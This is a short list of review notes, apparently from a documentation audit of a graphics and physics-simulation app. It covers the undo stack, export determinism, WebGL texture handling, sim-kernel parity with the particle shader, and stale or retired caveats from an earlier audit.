- **Paint undo "lane"**: clarify it's typed entries in the *same* 50-entry
  stack storing full-res ImageData — no separate budget.
- **Rope/Rigid export caveat**: per-eval stepping currently means settle
  re-renders double-step and `startFrame > 0` inherits preview state —
  contradicts the Export section's determinism framing until the gate lands.
- **Watercolor Ink** deserves a sharp-edge entry (node-owned RGBA32F
  ping-pongs, deleteTexture-in-dispose, substeps scale simScale² capped 48).
- **Sim-kernel "mirror the GLSL exactly"**: add the contact-response caveat
  (CPU-side bounciness/friction scaling the particle shader lacks).
- **generate-recipe route header comment** ("engine would crash under Node")
  is still wrong — flagged in audit #1, still there.
- Retire audit #1's "fifth coercion copy" caveat — the single-sourcing is now
  real and verified.
